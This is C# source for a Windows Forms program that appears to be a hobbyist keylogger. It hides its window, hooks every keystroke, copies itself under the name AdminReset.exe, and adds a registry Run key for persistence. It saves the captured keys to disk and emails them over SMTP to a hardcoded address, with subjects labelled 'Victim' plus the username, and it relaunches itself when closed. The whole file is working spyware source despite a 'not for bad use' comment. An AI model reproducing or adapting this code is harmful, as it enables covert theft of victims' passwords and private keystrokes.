using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Threading;

/*Program copyrighted by Angelo Juanico :)))))*/
      /*Definetely not for bad use*/

/*Okay so I really suck at programming and this
        is one messy as fuck code LOL*/
namespace UltimateKeyLogAngelo
{
    public partial class Form1 : Form
    {
        bool stopCapture = false;

        GlobalKeyboardHook gHook;

        public Form1()
        {
            Thread.Sleep(2000);
            InitializeComponent();
        }

        int newFile = 0;

        //Imports for creating invisible form lol

        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll", EntryPoint = "GetWindowLong")]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        bool secretCode = false;

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();

            button1.Text = "Unhook and Close </3";
            button2.Text = "Hook <3";
            button1.Hide();
            button2.Hide();
            this.BackColor = Color.Beige;
            this.TransparencyKey = Color.Beige;
            textBox1.Hide();
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;


            int initialStyle = GetWindowLong(this.Handle, -20);
            SetWindowLong(this.Handle, -20, initialStyle | 0x80000 | 0x20);

            SetStartup();


            if (stopCapture == false)
            {
                gHook = new GlobalKeyboardHook();
                gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                    gHook.HookedKeys.Add(key);
            }

            if (Directory.Exists(@"C:\Cache"))
            {
                Directory.Delete(@"C:\Cache", true);
            }

            copyFile();
        }

        string rndFolder = Path.GetRandomFileName();
        private void copyFile()
        {
            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
            string copyfileDir = @"C:\" + rndFolder + "\\AdminReset.exe";

            if (!Directory.Exists(@"C:\" + rndFolder))
            {
                Directory.CreateDirectory(@"C:\" + rndFolder);
                //Exception Error
                System.IO.File.Copy(Application.ExecutablePath, copyfileDir, true);
            }
        }
        private void SetStartup()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue(rndFolder, @"C:\" + rndFolder + "\\AdminReset.exe");
        }


        // Converts captured keys into string to put into the textbox
        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            textBox1.Text += ((char)e.KeyValue).ToString();

            if (textBox1.Text.Length >= 500)
            {
                CreateFile();
            }
        }

        // Creates directories and avoids exception errors and 
        // creates a streamwriter with the captured keys in the texbox
        private void CreateFile()
        {
            string rootDir = @"C:\";
            string subDir = @"C:\Cache";

            if (!Directory.Exists(rootDir))
            {
                Directory.CreateDirectory(rootDir);
            }

            if (!Directory.Exists(subDir))
            {
                Directory.CreateDirectory(subDir);
            }

            newFile = newFile + 1;

            TextWriter writer = new StreamWriter(@"C:\Cache\" + newFile + "System.txt");


            writer.Write(textBox1.Text);

            writer.Close();

            textBox1.Text = String.Empty;

            sendMail();
        }


        //Sends mail through SMTP connection
        private void sendMail()
        {
            this.SendToBack();

            stopCapture = true;

            MailMessage mail = new MailMessage();

            mail.From = new MailAddress("youremail@outlook.com");
            mail.To.Add("youremail@outlook.com");

            SmtpClient SmtpServer = new SmtpClient("smtp.live.com", 587);


            SmtpServer.UseDefaultCredentials = false;
            SmtpServer.EnableSsl = true;

            #region // Only for me dont open tyvm
            SmtpServer.Credentials = new NetworkCredential("youremail@outlook.com", "password123");
            #endregion  

            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            mail.Subject = "Victim " + userName;
            mail.Body = "Contents.";

            mail.Attachments.Add(new Attachment("C:/Cache/" + newFile + "System.txt"));

            SmtpServer.Send(mail);

            stopCapture = false;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            gHook.hook();
            timer1.Stop();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {

            //This will fuck the computer up so I recommend turning this off LOL
            //Basically calls to the copied startup location and creates a loop.
            if (secretCode == false)
            {
                gHook.unhook();
                string filePath = @"C:\" + rndFolder + "\\AdminReset.exe";
                System.Diagnostics.Process.Start(filePath);
            }

            //Debugging purposes.
            if (secretCode == true)
            {
                gHook.unhook();
                Application.Exit();
            }
        }






        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            //gHook.unhook();
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //gHook.hook();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {

        }

        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {

        }

        private void rndCounter_Tick(object sender, EventArgs e)
        {

        }
    }
}
